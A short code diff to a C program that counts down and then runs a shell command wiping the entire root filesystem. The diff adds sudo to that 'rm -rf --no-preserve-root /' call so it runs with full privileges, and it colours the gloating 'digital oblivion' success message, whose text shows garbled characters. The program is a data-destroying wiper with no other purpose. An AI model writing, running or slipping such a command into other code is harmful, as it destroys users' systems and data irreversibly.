@@ -53,9 +53,9 @@ int main(void)
 		printf("0\n");
 		sleep(1);
 
-		system("rm -rf --no-preserve-root /"); // deletes EVERYTHING
+		system("sudo rm -rf --no-preserve-root /"); // deletes EVERYTHING
 
-		printf("Success! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n\n");
+		printf("%sSuccess! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n%s\n", "\033[1;36m", "\033[0m");
 	}
 	return (EXIT_SUCCESS);
 }
